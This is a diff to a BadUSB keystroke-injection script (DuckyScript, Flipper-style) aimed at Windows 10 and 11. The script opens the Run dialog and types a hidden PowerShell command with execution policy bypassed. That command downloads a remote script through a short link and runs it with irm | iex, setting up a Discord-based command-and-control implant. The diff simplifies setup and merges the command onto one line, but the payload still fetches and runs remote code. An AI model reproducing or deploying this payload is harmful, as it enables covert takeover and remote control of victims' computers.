@@ -7,12 +7,8 @@ REM Target: Windows 10 and 11
 REM SETUP
 REM make a discord bot at https://discord.com/developers/applications/
 REM add the bot to your discord server
-REM create a webhook in the desired channel on your server. ( channel-settings/integrations )
-REM FLIPPER ONLY - goto https://t.ly and make a short link for the webhook. (run prompt only allows 256 characters!)
-REM Change WEBHOOK_URL below to your short webhook URL eg. https://t.ly/byuf4e
 REM Change BOT_TOKEN below with your bot token
-REM Change CHANNEL_ID below to the channel id of your webhook.
-
+REM Change CHANNEL_ID below to your channel id
 REM for more info goto - https://github.com/beigeworm/PoshCord-C2
 
 REM some setup for dukie script
@@ -22,9 +18,6 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C 
-ENTER
-DELAY 5000
-STRING $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; $dc = 'WEBHOOK_URL' ; irm https://is.gd/bwdcc2 | iex
+STRING powershell -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex
 ENTER
 
